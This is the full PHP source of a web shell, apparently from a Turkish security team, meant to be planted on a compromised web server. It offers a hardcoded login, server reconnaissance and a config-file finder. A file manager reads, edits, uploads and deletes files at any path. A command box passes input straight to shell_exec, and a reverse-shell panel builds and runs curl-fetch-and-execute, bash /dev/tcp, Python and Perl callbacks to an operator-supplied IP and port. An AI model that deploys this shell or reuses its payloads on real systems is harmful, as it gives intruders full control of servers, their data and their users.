<?php
session_start();

$server_info = [
    'Disable Function:' => ini_get('disable_functions') ?: 'All Function Enable', 
    'Safe Mode:' => ini_get('safe_mode') ? 'On' : 'Off', 
    'Open Base Dir:' => ini_get('open_basedir') ?: 'Not Set', 
    'PHP Version:' => phpversion(), 
    'Register Global:' => ini_get('register_globals') ? 'Enable' : 'Disable', 
    'Curl:' => function_exists('curl_version') ? 'Enable' : 'Disable', 
    'Database Mysql:' => extension_loaded('mysqli') ? 'Enable' : 'Off', 
    'Remote Include:' => ini_get('allow_url_include') ? 'Enable' : 'Disable', 
    'Disk Free Space:' => round(disk_free_space("/") / 1024 / 1024 / 1024, 2) . ' GB',
    'Total Disk Space:' => round(disk_total_space("/") / 1024 / 1024 / 1024, 2) . ' GB', 
];


$true_username = "admin";
$true_password = "yavuz";
$fileContent = '';
$fileToEdit = '';
$showFileManager = true; 
$startDir = __DIR__;

$startDir = __DIR__; 


function findConfigFilesRecursively($dir) {
    $configFiles = [];
    $configFilePatterns = ['*.ini', '*.conf', '*.cfg']; 

 
    $filesAndDirs = scandir($dir);
    foreach ($filesAndDirs as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        
        $path = $dir . DIRECTORY_SEPARATOR . $item;

        
        if (is_dir($path)) {
            $configFiles = array_merge($configFiles, findConfigFilesRecursively($path));
        } else {
            
            foreach ($configFilePatterns as $pattern) {
                if (fnmatch($pattern, basename($path))) {
                    $configFiles[] = $path;
                }
            }
        }
    }

    return $configFiles;
}


$selectedDirectory = $startDir;
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['directory'])) {
        $selectedDirectory = $_POST['directory'];  
    } elseif (!empty($_POST['manual_directory'])) {
        $selectedDirectory = $_POST['manual_directory'];  
    }
}
$configFiles = findConfigFilesRecursively($selectedDirectory);


if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST["username"]) && isset($_POST["password"])) {
        $username = $_POST["username"];
        $password = $_POST["password"];
        if ($username === $true_username && $password === $true_password) {
            $_SESSION["loggedin"] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        } else {
            $error = "Hatalı kullanıcı adı veya şifre.";
        }
    }
    if (isset($_POST["downloadFile"])) {
        if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
            $fileToDownload = $_POST["downloadFile"];
    
            
            if (is_dir($fileToDownload)) {
                $zip = new ZipArchive();
                $zipFileName = basename($fileToDownload) . ".zip";
                
                
                if ($zip->open($zipFileName, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                    
                    $folderPath = realpath($fileToDownload);
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($folderPath),
                        RecursiveIteratorIterator::LEAVES_ONLY
                    );
                    
                    foreach ($files as $name => $file) {
                        
                        if (!$file->isDir()) {
                            $filePath = $file->getRealPath();
                            $relativePath = substr($filePath, strlen($folderPath) + 1);
                            $zip->addFile($filePath, $relativePath);
                        }
                    }
    
                    
                    $zip->close();
    
                    
                    header('Content-Description: File Transfer');
                    header('Content-Type: application/zip');
                    header('Content-Disposition: attachment; filename="' . $zipFileName . '"');
                    header('Expires: 0');
                    header('Cache-Control: must-revalidate');
                    header('Pragma: public');
                    header('Content-Length: ' . filesize($zipFileName));
                    readfile($zipFileName);
    
                    
                    unlink($zipFileName);
                    exit();
                } else {
                    echo "Zip dosyası oluşturulamadı.";
                }
            } elseif (file_exists($fileToDownload)) {
                
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($fileToDownload) . '"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($fileToDownload));
                readfile($fileToDownload);
                exit();
            } else {
                echo "Dosya veya klasör bulunamadı.";
            }
        } else {
            echo "Öncelikle giriş yapmalısınız.";
        }
    }
    
    
    if (isset($_POST["deleteFile"])) {
        if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
            $fileToDelete = $_POST["deleteFile"];
            if (is_file($fileToDelete) && unlink($fileToDelete)) {
                echo "<script>alert('Dosya başarıyla silindi.');</script>";
            } else {
                echo "<script>alert('Dosya silinemedi.');</script>";
            }
        } else {
            echo "Öncelikle giriş yapmalısınız.";
        }
    }
    if (isset($_POST["editFile"])) {
        if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
            $fileToEdit = $_POST["editFile"];
            $fileExtension = strtolower(pathinfo($fileToEdit, PATHINFO_EXTENSION));
            $allowedExtensions = ['txt', 'php', 'config', 'log', 'html', 'css', 'js', 'json', 'xml', 'csv', 'md', 'yaml', 'txt', 'ini', 'bat'];
    
            if (in_array($fileExtension, $allowedExtensions)) {
                if (is_file($fileToEdit)) {
                    $fileContent = @file_get_contents($fileToEdit);
                    if ($fileContent === false) {
                        session_start();
                        $_SESSION['error_message'] = 'Dosya okuma hatası. Yetkisiz erişim veya dosya bulunamadı.';
                        header('Location: ' . $_SERVER['HTTP_REFERER']); 
                        exit();
                    }
                    $showFileManager = false;
                } else {
                    echo "<script>alert('Belirtilen dosya bulunamadı veya geçersiz bir dosya.');</script>"; 
                }
            } else {
                echo "<script>alert('Bu dosya düzenlenemez. Sadece metin dosyaları düzenlenebilir.');</script>"; 
            }
        }
    }
    if (isset($_POST["searchFile"])) {
        $searchQuery = $_POST["searchQuery"];
        $searchResults = [];
        if (isset($_POST['currentDir'])) {
            $currentDir = $_POST['currentDir'];
        } else {
            $currentDir = 'C:/xampp/htdocs'; 
        }
        function searchFiles($dir, $query, &$results) {
            $files = array_diff(scandir($dir), array('.', '..'));
            foreach ($files as $file) {
                $filePath = $dir . '/' . $file;
                if (is_dir($filePath)) {
                    continue; 
                } else {
                    if (strpos($file, $query) !== false) {
                        $results[] = $filePath;
                    }
                }
            }
        }

        searchFiles($currentDir, $searchQuery, $searchResults);
    }
    if (isset($_POST["saveFile"])) {
        $filePath = $_POST["filePath"];
        $fileContent = $_POST["fileContent"];

        if (file_put_contents($filePath, $fileContent) !== false) {
            echo "<script>alert('Dosya başarıyla kaydedildi.');</script>";
        } else {
            echo "<script>alert('Dosya kaydedilemedi.');</script>";
        }
    }
}

if (isset($_POST["uploadFile"])) {
    if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
        $targetDir = $_POST["currentDir"] . '/'; 
        $targetFile = $targetDir . basename($_FILES["fileToUpload"]["name"]);
        $uploadOk = 1;
        $fileType = strtolower(pathinfo($targetFile, PATHINFO_EXTENSION));
        if (file_exists($targetFile)) {
            echo "<script>alert('Bu dosya zaten mevcut.');</script>";
            $uploadOk = 0;
        }
        if ($uploadOk == 1) {
            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
                echo "<script>alert('Dosya başarıyla yüklendi.');</script>";
            } else {
                echo "<script>alert('Üzgünüm, dosya yüklenemedi.');</script>";
            }
        }
    } else {
        echo "<script>alert('Öncelikle giriş yapmalısınız.');</script>";
    }
}
if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
    
    $startDir = __DIR__;
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : $startDir; 

    echo '<div class="header">
        <img src="https://media.licdn.com/dms/image/v2/D4D0BAQGqoEEuidQkmA/company-logo_200_200/company-logo_200_200/0/1705995058225/siberyavuzlar_logo?e=2147483647&v=beta&t=1drcCqNBFWuAVb5XXKTLItz90XGy_1-hEwcFuUYBSR0" alt="Yavuzlar Logo" class="logo">
        <span class="neon-text">Yavuzlar Web Security Team</span>
    </div>';
    echo '
   

    <div class="menu">
        <a href="?server_info=false">File Managament</a>
        <a href="?server_info=true">Server İnfo</a>
        <a href="?scan_f=true">Config Search</a>
        <a href="?revers=true">Revers Shell</a>
        <a href="?terminal=true">Command Shell</a>
    </div>';
    if (isset($_GET['terminal']) && $_GET['terminal'] === 'true') {
        $showFileManager = false;
    
        echo '<style>';
        echo 'body { font-family: Arial, sans-serif; background-color: #000; color: #0f0; text-align: center; }';
        echo 'h1 { margin: 20px 0; }';
        echo 'form { margin-bottom: 20px; }';
        echo 'input, button { padding: 10px; margin: 10px; font-size: 16px; color: #0f0; background-color: #000; border: 2px solid #0f0; box-shadow: 0 0 10px #0f0; }';
        echo 'input[type="text"] { width: 400px; }';
        echo '.terminal-box { border: 2px solid #0f0; border-radius: 10px; padding: 20px; display: inline-block; margin: 10px; box-shadow: 0 0 20px #0f0, inset 0 0 10px #0f0; margin-top: 40px; max-height: 600px; width: 600px; text-align: left; overflow-y: auto; }';
        echo '.path { font-weight: bold; color: #0f0; }';
        echo '.help { text-align: left; }';
        echo '</style>';
    
        echo '<div class="terminal-box">';
        echo '<h1>Command Shell</h1>';
    
    
    
        echo '<form method="post">';
        echo '    <input type="text" name="command" placeholder="Komut girin" autofocus>';
        echo '    <button type="submit">Gönder</button>';
        echo '</form>';
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
            $command = strtolower(trim($_POST['command']));
    
            if ($command === 'help') {
                echo '<div class="help">';
                echo '<h3>Kullanılabilir Komutlar:</h3>';
                echo '<ul>';
                echo '    <li><strong>cd [dizin]</strong>: Dizini değiştirir.</li>';
                echo '    <li><strong>ls</strong>: Dosyaları listeler.</li>';
                echo '    <li><strong>clear</strong>: Ekranı temizler.</li>';
                echo '    <li><strong>help</strong>: Komut listesini gösterir.</li>';
                echo '</ul>';
                echo '</div>';
            } elseif ($command === 'clear') {
                header("Refresh:0");
            } else {
                $output = shell_exec($command);
                echo '<pre>' . htmlspecialchars($output) . '</pre>';
            }
        }
    
        echo '</div>'; 
    }
    
    if (isset($_GET['revers']) && $_GET['revers'] === 'true') {
       $showFileManager = false;
       
    echo '    <style>';
    echo '        body {';
    echo '            font-family: Arial, sans-serif;';
    echo '            background-color: #000;';
    echo '            color: #0f0;';
    echo '            text-align: center;';
    echo '        }';
    echo '        h1 {';
    echo '            margin: 20px 0;';
    echo '        }';
    echo '        form {';
    echo '            margin-bottom: 20px;';
    echo '        }';
    echo '        input, button {';
    echo '            padding: 10px;';
    echo '            margin: 10px;';
    echo '            font-size: 16px;';
    echo '            color: #0f0;';
    echo '            background-color: #000;';
    echo '            border: 2px solid #0f0;';
    echo '            box-shadow: 0 0 10px #0f0;';
    echo '            text-align: center;';
    echo '        }';
    echo '        .neon-box {';
    echo '            border: 2px solid #0f0;';
    echo '            border-radius: 10px;';
    echo '            padding: 20px;';
    echo '            display: inline-block;';
    echo '            margin: 10px;';
    echo '            box-shadow: 0 0 20px #0f0, inset 0 0 10px #0f0;';
    echo '            margin-top: 40px;';
    echo '        }';
    echo '    </style>';
    echo '<div class="neon-box">';
    echo '    <h1>Reverse Shell</h1>';
    
    echo '    <form method="post">';
    echo '        <label for="ip">IP:</label>';
    echo '        <input type="text" name="ip" id="ip" placeholder="IP adresi" required>';
    echo '        <br>';
    echo '        <label for="port">Port:</label>';
    echo '        <input type="text" name="port" id="port" placeholder="Port numarası" required>';
    echo '        <br>';
    echo '        <button type="submit" name="shell" value="curl">Curl ile Shell</button>';
    echo '        <button type="submit" name="shell" value="bash">Bash ile Shell</button>';
    echo '        <button type="submit" name="shell" value="python">Python ile Shell</button>';
    echo '        <button type="submit" name="shell" value="perl">Perl ile Shell</button>';  // Perl butonu
    echo '    </form>';
    echo '</div>';
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $ip = htmlspecialchars($_POST['ip']);
        $port = htmlspecialchars($_POST['port']);
        $shellType = $_POST['shell'];
    
        switch ($shellType) {
            case 'curl':
                $command = "curl http://$ip:$port -o /tmp/shell.sh && bash /tmp/shell.sh";
                break;
            case 'bash':
                $command = "bash -i >& /dev/tcp/$ip/$port 0>&1";
                break;
            case 'python':
                $command = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
                break;
            case 'perl':
                $command = "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'";
                break;
            default:
                $command = "";
        }
    
        if ($command) {
            $output = shell_exec($command);
            echo "<p>Reverse Shell Komutu: <code>$command</code></p>";
            echo "<p>Çıktı: <pre>$output</pre></p>";
        }
    }
    }

    if (isset($_GET['scan_f']) && $_GET['scan_f'] === 'true') {
        $showFileManager = false;
        echo '    <style>';
        echo '        body {';
        echo '            font-family: Arial, sans-serif;';
        echo '            background-color: #000;';
        echo '            color: #0f0;';
        echo '            text-align: center;';
        echo '        }';
        echo '        h1 {';
        echo '            margin: 20px 0;';
        echo '        }';
        echo '        form {';
        echo '            margin-bottom: 20px;';
        echo '        }';
        echo '        input, button {';
        echo '            padding: 10px;';
        echo '            margin: 10px;';
        echo '            font-size: 16px;';
        echo '            color: #0f0;';
        echo '            background-color: #000;';
        echo '            border: 2px solid #0f0;';
        echo '            box-shadow: 0 0 10px #0f0;';
        echo '            text-align: center;';
        echo '        }';
        echo '        input[type="text"] {';
        echo '            width: 250px;'; 
        echo '        }';
        echo '        table {';
        echo '            width: 80%;';
        echo '            margin: 20px auto;';
        echo '            border-collapse: collapse;';
        echo '            border: 2px solid #0f0;';
        echo '            box-shadow: 0 0 15px #0f0;';
        echo '        }';
        echo '        th, td {';
        echo '            border: 1px solid #0f0;';
        echo '            padding: 10px;';
        echo '            text-align: left;';
        echo '        }';
        echo '        th {';
        echo '            background-color: #000;';
        echo '            color: #0f0;';
        echo '            box-shadow: 0 0 10px #0f0;';
        echo '        }';
        echo '        td {';
        echo '            background-color: #111;';
        echo '            color: #0f0;';
        echo '        }';
        echo '        .neon-box {';
        echo '            border: 2px solid #0f0;';
        echo '            border-radius: 10px;';
        echo '            padding: 20px;';
        echo '            display: inline-block;';
        echo '            margin: 10px;';
        echo '            box-shadow: 0 0 20px #0f0, inset 0 0 10px #0f0;';
        echo '            margin-top: 40px;';
        echo '            max-height: 500px;'; 
        echo '            overflow-y: auto;'; 
        echo '        }';
        echo '    </style>';
        echo '<div class="neon-box">';
        echo '    <h1>Config Finder</h1>';
        echo '    <form method="post">';
        echo '        <label for="directory">Manuel Dizin Girin:</label>';
        echo '        <input type="text" class="ad" name="manual_directory" id="manual_directory" placeholder="Dizin girin" value="' . htmlspecialchars($selectedDirectory) . '">';
        echo '        <br>';
        echo '        <button type="submit" class="ad" >Ara</button>';
        echo '    </form>';
        if (!empty($configFiles)) {
            echo '    <table>';
            echo '        <tr>';
            echo '            <th>Dosya Yolu</th>';
            echo '        </tr>';
            foreach ($configFiles as $file) {
                echo '        <tr>';
                echo '            <td>' . htmlspecialchars($file) . '</td>';
                echo '        </tr>';
            }
            echo '    </table>';
        } else {
            echo '    <p>Seçilen dizinde konfigürasyon dosyası bulunamadı.</p>';
        }
        
        echo '</div>'; 
    }
    if (isset($_GET['server_info']) && $_GET['server_info'] === 'true') {
        $showFileManager = false;
echo '<style>
    .neon-box {
    position: absolute; 
    top: 50%; 
    left: 50%;
    transform: translate(-50%, -50%); 
    background-color: rgba(0, 255, 0, 0.1); 
    border: 2px solid lime; 
    box-shadow: 0 0 20px rgba(0, 255, 0, 0.7); 
    border-radius: 10px; 
    padding: 20px;
    width: 300px; 
    text-align: center; 
}


        h2 {
            color: lime;
        }

        ul {
            list-style-type: none; 
            padding: 0; 
        }

        li {
            margin: 10px 0;
            color: #00FF00; 
        }
</style>';
echo '<div class="neon-box">';
echo '<h1>Server Configuration</h1>';
echo '<table>';
echo '<tr>';
echo '<th>Configuration</th>';
echo '<th>Value</th>';
echo '</tr>';

foreach ($server_info as $key => $value) {
    echo '<tr>';
    echo '<td>' . htmlspecialchars($key) . '</td>';
    echo '<td>' . htmlspecialchars($value) . '</td>';
    echo '</tr>';
}

echo '</table>';
echo '</div>';
    }
    if(isset($_GET['server_info']) && $_GET['server_info'] === 'false'){
        $showFileManager = true;
    }
    function listDirectory($dir) {
        $files = array_diff(scandir($dir), array('.', '..'));
        return $files;
    }
    $parentDir = dirname($currentDir);
    $items = listDirectory($currentDir);
    if ($showFileManager) {
        echo '<div class="file-manager-container">';
        echo '<h2 class="directory-title">Dizin: <span>' . htmlspecialchars($currentDir) . '</span></h2>';
        echo "<ul class='file-list'>";
    
        echo '<form action="" method="post" class="search-form">
                <input type="hidden" name="currentDir" value="' . htmlspecialchars($currentDir) . '">
                <input type="text" name="searchQuery" placeholder="Dosya ara" required>
                <button type="submit" name="searchFile" class="text-link search">Ara</button>
              </form>';
              echo '
              <div class="upload-form">
                  <form action="" method="post" enctype="multipart/form-data" class="upload-form">
                      <input type="file" id="file-upload" name="fileToUpload" onchange="displayFileName()" style="display:none;">
                      <label class="sec" for="file-upload">Dosya Seç</label>
                      <div id="file-name" class="uploaded-file" style="display:none;"></div>
                      <input type="hidden" name="currentDir" value="' . htmlspecialchars($currentDir) . '">
                      
                      <button type="submit" name="uploadFile" class="tes">Yükle</button>
                  </form>
              </div>
              ';
              
              
              echo '
              <script>
              function displayFileName() {
                  const fileInput = document.getElementById("file-upload");
                  const fileNameDisplay = document.getElementById("file-name");
              
                  if (fileInput.files.length > 0) {
                      fileNameDisplay.style.display = "block"; // Görünür yap
                      fileNameDisplay.innerText = fileInput.files[0].name; // Dosya adını göster
                  }
              }
              </script>
              ';
echo '<div class="back-button-wrapper">';
echo '<a class="back-button" href="?dir=' . urlencode($parentDir) . '">Geri</a>';
echo '</div>';
        foreach ($items as $item) {
            $fullPath = $currentDir . '/' . $item;
            echo "<li class='file-item'>";
if (is_dir($fullPath)) {
    echo '<a href="?dir=' . urlencode($fullPath) . '" class="file-name dir">' . htmlspecialchars($item) . '</a>';
} else {
    echo '<span class="file-name file">' . htmlspecialchars($item) . '</span>';
    $perms = fileperms($fullPath);
    $permissionString = substr(sprintf('%o', $perms), -3); 
    echo '<span class="file-permissions"> İzinler: ' . $permissionString . '</span>'; 
}


            echo "<div class='button-group'>";
            if (is_dir($fullPath)) {
                
                echo '<form action="" method="post" class="download-form">
                        <input type="hidden" name="downloadFile" value="' . htmlspecialchars($fullPath) . '">
                        <button type="submit" class="text-link download">İndir</button>
                      </form>';
            } elseif (is_file($fullPath)) {
                
                echo '<form action="" method="post" class="download-form">
                        <input type="hidden" name="downloadFile" value="' . htmlspecialchars($fullPath) . '">
                        <button type="submit" class="text-link download">İndir</button>
                      </form>';
            
                echo '<form action="" method="post" class="delete-form">
                        <input type="hidden" name="deleteFile" value="' . htmlspecialchars($fullPath) . '">
                        <button type="submit" class="text-link delete">Sil</button>
                      </form>';
            
                echo '<form action="" method="post" class="edit-form">
                        <input type="hidden" name="editFile" value="' . htmlspecialchars($fullPath) . '">
                        <button type="submit" class="text-link edit">Düzenle</button>
                      </form>';
            }
        }            
        echo "</ul></div>"; 
        echo '<script type="text/javascript">';
        echo 'var searchResults = [];'; 
        if (isset($searchResults)) {
            if (empty($searchResults)) {
                echo 'alert("Dosya bulunamadı.");'; 
            } else {
                echo 'searchResults.push("Arama Sonuçları:");'; 
                foreach ($searchResults as $result) {
                    echo 'searchResults.push("' . addslashes(htmlspecialchars($result)) . '");'; 
                }
                echo 'alert(searchResults.join("\\n"));'; 
            }
        }
        echo '</script>';
        
    }
    if ($fileToEdit && !empty($fileContent)) {
        
        echo '<div class="edit-form-container">
            <h3>Dosya Düzenle</h3>
            <form method="post">
                <textarea name="fileContent" rows="10" cols="50">' . htmlspecialchars($fileContent) . '</textarea><br>
                <input type="hidden" name="filePath" value="' . htmlspecialchars($fileToEdit) . '">
                <br>
                <button type="submit" name="saveFile" class="kaydet">Kaydet</button>
                <button type="button" onclick="history.back()" class="geri-buton">Geri</button> 
            </form>
        </div>';

echo '<style>';
echo '
.geri-buton {
    font-size: 12px;
    padding: 9px 8px;
    color: greygreen;
    margin: 0px;
    border-radius: 5px; 
    cursor: pointer; 
    
}


.geri-buton:hover {
    background-color: #45a049;
}


.kaydet, .geri-buton {
    display: inline-block; 
    margin-top: 10px; 
}


.edit-form-container {
    background-color: black; 
    border: 2px solid #00ff00;
    padding: 20px; 
    border-radius: 10px; 
    box-shadow: 0 0 10px #00ff00; 
    margin: 20px auto;
    width: 80%; 
    max-width: 600px; 
    color: #00ff00; 
}

.kaydet {
    padding: 10px 20px; 
}

textarea {
    width: 100%; 
    background-color: black; 
    color: #00ff00; 
    border: 1px solid #00ff00; 
    border-radius: 5px;
    padding: 10px; 
    resize: none; 
    font-size: 1rem; 
}

button {
    background-color: #00ff00; 
    color: black; 
    padding: 10px 20px; 
    border: none; 
    border-radius: 5px; 
    cursor: pointer; 
    font-size: 1rem; 
}

button:hover {
    background-color: #00cc00;
}
';
echo '</style>';

    }
} else {
    echo '<div class="header">
        <img src="https://media.licdn.com/dms/image/v2/D4D0BAQGqoEEuidQkmA/company-logo_200_200/company-logo_200_200/0/1705995058225/siberyavuzlar_logo?e=2147483647&v=beta&t=1drcCqNBFWuAVb5XXKTLItz90XGy_1-hEwcFuUYBSR0" alt="Yavuzlar Logo" class="logo">
        <span class="neon-text">Yavuzlar Web Security Team</span>
    </div>';
    echo '<div class="login-container">';
    echo '<h2>Giriş Yap</h2>';
    if (isset($error)) {
        echo '<div class="error-message">' . $error . '</div>'; 
    }
    echo '<form method="post" action="">
            <input type="text" name="username" placeholder="Kullanıcı Adı" required>
            <input type="password" name="password" placeholder="Şifre" required>
            <input type="submit" value="Giriş Yap">
          </form>';
    
    echo '</div>';
}


?>








<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yavuzlar Web Shell</title>
    <style>
body {
    background-color: black;
    color: white;
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
}

.header {
    display: flex;
    align-items: center;
    padding: 20px;
    border-bottom: 2px solid #00ff00;
    background-color: rgba(0, 0, 0, 0.8);
}

.logo {
    width: 50px;
    height: auto;
    margin-right: 20px;
}

.neon-text {
    color: black;
    font-size: 1.5rem;
    font-weight: bold;
    text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, 0 0 20px #00ff00, 0 0 30px #00ff00;
}

.file-manager-container {
    width: 900px;
    height: 600px;
    background-color: black;
    border: 2px solid #00FF00;
    padding: 5px;
    margin: 20px auto;
    overflow-y: auto;
    border-radius: 10px;
    box-shadow: 0 0 10px #00FF00; 
}

.directory-title {
    margin-top: 5px;
    margin-bottom: 5px;
    padding: 5px;
    font-size: 18px;
    font-weight: bold;
    color: #28a745;
    text-align: center;
}

.file-list {
    list-style-type: none;
    padding: 0;
    margin: 0;
}

.file-item {
    border-bottom: 1px solid #00FF00;
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 10px 0;
}

.file-name {
    color: whitesmoke;
    text-decoration: none;
    font-size: 16px;
    flex: 1;
    min-width: 150px;
}

.file-permissions {
    min-width: 80px;
    margin-left: 10px;
    font-size: 0.8rem;
    color: #00FF00;
    text-align: right;
}

.file-name.dir {
    font-weight: bold;
}

.button-group {
    display: flex;
    gap: 10px;
}



.login-container {
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 20px;
    border: 2px solid #00ff00;
    border-radius: 10px;
    background-image: url('https://cdn.textures4photoshop.com/tex/thumbs/matrix-code-animation-gif-free-animated-background-716.gif');
    background-size: cover;
    width: 300px;
    margin: 100px auto;
    box-shadow: 0 0 10px #00ff00; 
}

input[type="text"],
input[type="password"] {
    width: 100%;
    padding: 10px;
    margin: 10px 0;
    background-color: black;
    border: 1px solid #00ff00;
    color: #00ff00;
    border-radius: 5px;
}

input[type="submit"] {
    background-color: #00ff00;
    color: black;
    padding: 10px 20px;
    border: none;
    cursor: pointer;
    border-radius: 5px;
    font-size: 1rem;
}

input[type="submit"]:hover {
    background-color: #00cc00;
}

.search-results {
    margin-top: 10px;
    color: white;
}

.file-edit {
    margin-top: 20px;
    border: 2px solid #00ff00; 
    padding: 20px; 
    border-radius: 10px; 
    background-color: rgba(0, 0, 0, 0.8); 
    box-shadow: 0 0 10px #00ff00; 
}



.search-form {
    text-align: flex;
    padding: 1px;
    margin: 0px;
    display: flex; 
    align-items: center; 
}

.back-button {
    width: 80px;
    height: 30px;
    display: inline-flex;
    justify-content: center;
    align-items: center;
    background-color: #28a745;
    color: black; 
    border-radius: 5px;
    text-decoration: none;
    transition: background-color 0.3s ease;
    font-size: 16px;
    font-family: 'Arial', sans-serif;
    font-weight: bold;
    overflow: hidden;
    margin-top: 0px;
}

.back-button:hover {
    background-color: #218838; 
}

::-webkit-scrollbar {
    width: 12px;
    height: 12px;
}

::-webkit-scrollbar-thumb {
    background: #28a745; 
    border-radius: 10px; 
    border: 3px solid #000; 
}

::-webkit-scrollbar-track {
    background: #000; 
    border-radius: 10px; 
}

::-webkit-scrollbar-thumb:hover {
    background: #218838; 
}

.file-permissions {
    margin-left: 10px;
    font-size: 0.8rem;
    color: #00FF00;
}





.uploaded-file {
    padding: 0px 0px;
    margin: 0 5px;
    font-size: 14px; 
    color: #0f0; 
    margin-left: 0px;
    margin-top: -6px;
    padding: 4px; 
    border: 1px solid #0f0;
    border-radius: 3px; 
    
}





.search-form button{
    width: 60px; 
    height: 35px; 
          ;
    margin-left: 10px;
    
        
}
.back-button {
    width: 30px; 
    height: 5px; 
          padding: 10px;';
         margin: 10px;';
         font-size: 16px;';
         color: #0f0;';
       background-color: #000;';
       border: 2px solid #0f0;';
        box-shadow: 0 0 10px #0f0;';
         text-align: center;';
}


.back-button:hover {
    background-color: #0f8b00; 
}



.footer {
    text-align: center;
    margin-top: 20px;
    color: white;
    font-size: 0.8rem;
    position: absolute;
    bottom: 10px;
    width: 100%;
}

.social-icons {
    margin-top: 10px;
}

.social-icons img {
    width: 30px;
    height: 30px;
    margin: 0 5px;
}




.menu {
            margin-top: 20px;
            display: flex;
            justify-content: center;
        }

        .menu a {
            margin: 0 15px;
            text-decoration: none;
            color: black;
            font-size: 1.2rem;
            font-weight: bold;
            text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, 0 0 20px #00ff00;
            transition: color 0.3s ease;
        }

        .menu a:hover {
            color: #00cc00;
        }
        .file-list {
            list-style-type: none;
    padding: 0;
    margin: 0;
}

.file-item {
    border-bottom: 1px solid #00FF00;
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 5px 0;
    font-size: 12px;
    min-height: 40px; 
}

.file-name {
    color: white;
    text-decoration: none;
    font-size: 14px;
    flex: 2;
    min-width: 100px;
    align-self: center; 
}

.file-permissions {
    
    color: white;
    font-size: 12px;
    padding: 5px 10px; 
    border-radius: 3px;
    text-align: center;
    min-width: 60px;
    margin-left: 10px;
    align-self: center; 
}

.button-group {
    display: flex;
    gap: 10px;
   
}



.dir {
    font-weight: bold;
}

.file {
    font-weight: normal;
}

.button-group {
    display: flex;
    gap: 1px;
    margin-top: 10px;
    align-items: center; 
}

button {
    background-color: transparent;
    color: #00FF00;
    border: 1px solid #00FF00;
    padding: 2px 10px;
    border-radius: 3px;
    cursor: pointer;
    font-size: 10px;
    align-self: center; 
}

button:hover {
    background-color: #00FF00;
    color: black;
}





.upload-form input[type="file"] {
    display: none; 
}

.upload-form label {
    display: inline-block;
    padding: 4px 5px;
    font-size: 14px; 
    
    background-color: #000; 
    border: 1px solid ; 
    border-radius: 2px; 
    
    cursor: pointer; 
    transition: background-color 0.3s, box-shadow 0.3s, transform 0.3s; 
    text-align: center; 
}


.upload-form {
   
    display: flex; 
    align-items: center; 
}


.sec {
    display: inline-block; 
    margin-top: 0px;
    margin-left: 0px;
    margin-bottom: 5px;
    color: #00FF00; 
    cursor: pointer;
    margin-right: 4px; 
}


.tes{
    padding: 6px 6px; 
    
    margin-top: -5px; 
    border-radius: 2px;
    
    color: #00FF00; 
    cursor: pointer; 
    
}

.ad{
    padding: 10px 20px;
}
</style>
</head>
<body>
    


    <div class="footer">
        © 2024 Yavuzlar Web Security
        <div class="social-icons">
            <a href="https://github.com/Yavuzlar"><img src="https://img.icons8.com/m_sharp/200/FFFFFF/github.png" alt="Github"></a>
            <a href="https://www.instagram.com/siberyavuzlar/"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" alt="Instagram"></a>
            <a href="https://www.linkedin.com/company/siberyavuzlar"><img src="https://content.linkedin.com/content/dam/me/business/en-us/amp/brand-site/v2/bg/LI-Bug.svg.original.svg" alt="Linkedin"></a>
            <a href="https://yavuzlar.org"><img src="https://media.licdn.com/dms/image/v2/D4D0BAQGqoEEuidQkmA/company-logo_200_200/company-logo_200_200/0/1705995058225/siberyavuzlar_logo?e=2147483647&v=beta&t=1drcCqNBFWuAVb5XXKTLItz90XGy_1-hEwcFuUYBSR0" alt="Website"></a>
        </div>
    </div>
</body>
</html>
